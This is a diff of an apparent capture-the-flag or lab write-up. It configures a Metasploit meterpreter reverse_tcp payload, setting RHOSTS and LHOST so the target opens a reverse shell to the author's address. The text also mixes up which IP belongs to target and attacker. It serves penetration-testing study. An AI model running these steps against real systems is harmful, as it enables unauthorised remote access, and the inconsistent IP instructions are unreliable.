@@ -100,16 +100,20 @@ Payload options (windows/x64/meterpreter/reverse_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
-   LHOST     10.18.72.167     yes       The listen address (an interface may be specified)
+   LHOST                      yes       The listen address (an interface may be specified)
    LPORT     4444             yes       The listen port
 ```
 
-Looking at the `Required` options, I can see that `RHOSTS` is not set and `LHOST` is correctly set to my IP (This may need to be set if you are using a VPN)
+Looking at the `Required` options, I can see that `RHOSTS` and `LHOST`are not set. (As I am going through a VPN, I will need to make sure LHOST is set to my VPN address)
 
 **Setting options**   
 I need to set `RHOSTS` to be the IP address of the host I am attacking (10.18.72.167)
 
 `set RHOSTS 10.10.125.60`
+
+I need to set `LHOST` to be my IP (10.18.72.167)
+
+`set LHOST 10.18.72.167`
 
 **Running the exploit**   
 My end-goal is to get a reverse shell on the server, so before I run the exploit I need to tell metasploit to inject a reverse shell payload:
